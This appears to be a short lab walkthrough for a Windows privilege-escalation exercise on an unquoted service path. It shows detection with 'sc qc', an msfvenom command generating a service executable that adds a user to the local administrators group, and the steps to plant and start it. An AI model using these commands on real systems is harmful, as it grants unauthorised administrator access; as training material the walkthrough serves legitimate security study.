### Detection

Windows VM
```sh
# Open command prompt and type: 
> sc qc unquotedsvc
# Notice that the “BINARY_PATH_NAME” field displays a path that is not confined between quotes.
```

### Exploitation

Kali VM
```sh
# Open command prompt and type: 
> msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o common.exe
# Copy the generated file, common.exe, to the Windows VM.
```

Windows VM

```sh
# Place common.exe in ‘C:\Program Files\Unquoted Path Service’.
# Open command prompt and type: 
> sc start unquotedsvc
# It is possible to confirm that the user was added to the local administrators group by typing the following in the command prompt: 
> net localgroup administrators
```